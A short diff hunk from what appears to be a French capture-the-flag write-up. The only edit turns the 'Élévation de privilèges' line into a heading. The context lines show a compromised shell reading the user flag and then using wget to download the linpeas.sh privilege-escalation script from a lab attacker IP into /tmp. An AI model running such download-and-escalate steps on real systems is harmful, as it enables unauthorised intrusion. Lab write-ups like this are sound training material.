@@ -48,7 +48,7 @@ Après pas mal de tentatives, j'ai finalement réussi à avoir le shell. Il faut
 	whoami
 	cat ~/user.txt
 	
-Élévation de privilèges : 
+### Élévation de privilèges : 
 
 	cd /tmp
 	wget http://10.10.16.57/linpeas.sh
